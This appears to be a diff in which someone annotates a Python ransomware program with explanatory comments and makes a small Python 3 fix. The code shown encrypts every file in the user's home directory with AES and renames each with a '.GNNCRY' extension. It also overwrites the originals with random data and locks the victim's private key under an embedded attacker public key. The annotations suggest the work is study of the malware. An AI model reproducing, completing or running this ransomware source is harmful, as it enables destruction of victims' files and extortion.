@@ -19,6 +19,7 @@ from Crypto import Random
 from Crypto.Cipher import PKCS1_OAEP
 
 # const variables
+# I guess this is the public key of the attacker. 
 server_public_key = ("""-----BEGIN PUBLIC KEY-----
 MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxF5BOX3N5UN1CsHpnfuU
 58lOw0+scQ39hOn6Q/QvM6aTOnYZki57O6/JtgV2CetE+G5IZrRwYPAipFdChGM9
@@ -50,10 +51,16 @@ def encrypt_priv_key(msg, key):
         cifrado.append(ciphertext)
     return cifrado
 
+'''
+    By defualt, passes=1, that means, the for loop below will execute
+    once and only once. 
+
+'''
 def shred(file_name,  passes=1):
 
     def generate_data(length):
         chars = string.ascii_lowercase + string.ascii_uppercase + string.digits
+        # return a string containing randon characters.
         return ''.join(random.SystemRandom().choice(chars) for _ in range(length))
 
     if not os.path.isfile(file_name):
@@ -62,6 +69,7 @@ def shred(file_name,  passes=1):
 
     ld = os.path.getsize(file_name)
     fh = open(file_name,  "w")
+    # execute once to generate data and write to the file. 
     for _ in range(int(passes)):
         data = generate_data(ld)
         fh.write(data)
@@ -72,6 +80,13 @@ def shred(file_name,  passes=1):
 
 '''
     encrypt all files. 
+    returns a list.
+    Each element in the list is a tuple. 
+    The tuple contains a symmentric key and the encoded file path, which is encrypted by that key.
+    
+    The idea is to put some random content at the beginning, and then write encrypted content at the end. 
+    This may reduce entropy. 
+
 '''
 def start_encryption(files):
     AES_and_base64_path = []
@@ -89,8 +104,10 @@ def start_encryption(files):
             continue
 
         encrypted = AES_obj.encrypt(file_content)
+        # destroyed found_file. That is, replace it with random chars. 
         shred(found_file)
 
+        # append the encrypted one at the end. 
         new_file_name = found_file + ".GNNCRY"
         with open(new_file_name, 'wb') as f:
             f.write(encrypted)
@@ -109,10 +126,10 @@ def menu():
 
     # create ransomware directory 
     try:
-        os.mkdir(ransomware_path, 0700)
+        os.mkdir(ransomware_path, 0o700)
     except OSError:
         pass
-        
+
     # get the files in the home directory
     # /home/$USER
     files = get_files.find_files(home)
@@ -122,14 +139,21 @@ def menu():
     rsa_object = asymmetric.assymetric()
     rsa_object.generate_keys()
     
+    # Here is the public key of the attacker. 
     server_public_key_object = RSA.importKey(server_public_key)
-
+    
+    # Get victim's private key
     Client_private_key = rsa_object.private_key_PEM
+    # Get victim's public key
     Client_public_key = rsa_object.public_key_PEM
+    # encryp victim's private key & attacker's public key with attacker's public key.
+    # So, only attacker can read them. 
+    # I don't know why server_public_key is included. Maybe, the server side need this info later.  
     encrypted_client_private_key = encrypt_priv_key(Client_private_key, server_public_key)
     
     # save encrypted client private key to disk
     with open(ransomware_path + '/encrypted_client_private_key.key', 'wb') as output:
+        # serialize and write to the file. 
         pickle.dump(encrypted_client_private_key, output, pickle.HIGHEST_PROTOCOL)
     
     # save client public key to disk
@@ -151,13 +175,18 @@ def menu():
     # FILE ENCRYPTION STARTS HERE !!!
     # aes_keys_and_base64_path = start_encryption(files)
     # enc_aes_key_and_base64_path = []
+    
 
+    # The aes_keys_and_based_64_path is a list of tuples. 
+    # Each tuple is a (key, path) pair. 
+    # That is, each compromised file associated with an individual key. 
     for _ in aes_keys_and_base64_path:
         aes_key = _[0]
         base64_path = _[1]
 
-        # encrypt with the client public key
+        # encrypt with the client public key. For signature purpose. 
         encrypted_aes_key = client_public_key_object_cipher.encrypt(aes_key)
+        # So, you got lots of key,path pairs signed. 
         enc_aes_key_and_base64_path.append((encrypted_aes_key, base64_path))
     
     # free the old AES keys
@@ -174,7 +203,6 @@ def menu():
     enc_aes_key_and_base64_path = None
     del enc_aes_key_and_base64_path
     gc.collect()
-
 
     
 
